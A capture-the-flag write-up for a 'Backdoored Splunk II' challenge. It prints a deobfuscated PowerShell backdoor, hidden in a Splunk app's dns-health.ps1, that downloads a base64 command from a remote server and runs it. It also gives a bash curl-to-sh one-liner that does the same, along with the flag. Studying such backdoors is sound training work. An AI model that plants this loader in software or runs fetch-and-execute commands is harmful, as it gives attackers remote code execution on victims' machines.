# Backdoored Splunk II

## Solver : `Noderyos`

In `bin/powershell/dns-health.ps1` the line 20 has been added, after deobfuscating it, we get this code
```ps1
# $PORT below is dynamic to the running service of the `Start` button
@($html = (Invoke-WebRequest http://challenge.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dGhpc19pc190aGVfaHR0cF9zZXJ2ZXJfc2VjcmV0")} -UseBasicParsing).Content
if ($html -match '<!--(.*?)-->') {
    $value = $matches[1]
    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
    Invoke-Expression $command
})
```

by replicating it in bash `curl -H 'Authorization: Basic YmFja2Rvb3I6dGhpc19pc190aGVfaHR0cF9zZXJ2ZXJfc2VjcmV0' http://challenge.ctf.games:31766 | sed -n 's/<!-- \(.*\) -->/\1/p' | base64 -d | sh` we get the flag

## Flag : `flag{e15a6c0168ee4de7381f502439014032}`
